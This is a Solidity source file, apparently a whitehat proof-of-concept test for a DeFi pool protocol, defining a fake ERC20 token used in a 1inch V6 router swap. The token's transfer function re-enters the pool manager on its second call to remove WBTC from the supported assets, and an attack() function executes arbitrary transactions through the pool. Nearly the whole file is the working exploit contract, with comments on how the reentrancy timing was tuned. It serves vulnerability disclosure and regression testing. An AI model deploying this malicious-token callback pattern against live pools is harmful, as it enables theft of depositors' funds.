// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {PolygonConfig} from "test/integration/utils/foundry/config/PolygonConfig.sol";

contract FakeERC20ForOneInchV6Router {
  address public immutable poolManagerLogic;

  uint256 public counter;

  mapping(address => uint256) public balances;

  constructor(address _poolManagerLogic) {
    poolManagerLogic = _poolManagerLogic;
  }

  function balanceOf(address account) public view returns (uint256) {
    return balances[account];
  }

  function transfer(address to, uint256 value) public returns (bool) {
    if (PoolManagerLogic(poolManagerLogic).isSupportedAsset(PolygonConfig.WBTC)) {
      if (counter == 0) {
        // Whitehat notes:
        // Added so we only trigger the callback on the second transfer which (I think?) is when Fake -> WETH happens.
        // Otherwise what happens is that we run this logic when WBTC is still in the contract and we revert during `changeAssets()` as there is balance.
        // Tbh I thought `counter == 0` will not work and I'd have to swap 0 for another number as there are other transfers beforehand (i.e. during minting),
        // but I guess they are `transferFrom()`. It works, so it's good enough for me.
        counter++;
      } else {
        PoolManagerLogic.Asset[] memory add;
        address[] memory remove = new address[](1);
        remove[0] = PolygonConfig.WBTC;
        PoolManagerLogic(poolManagerLogic).changeAssets(add, remove); // Remove WBTC
      }
    }
    balances[to] += value;
    return true;
  }

  function attack(address dhedgePool, address to, bytes memory cd) public {
    PoolLogic(dhedgePool).execTransaction(to, cd);
  }

  function transferFrom(address, address to, uint256 value) public returns (bool) {
    balances[to] += value;
    return true;
  }
}
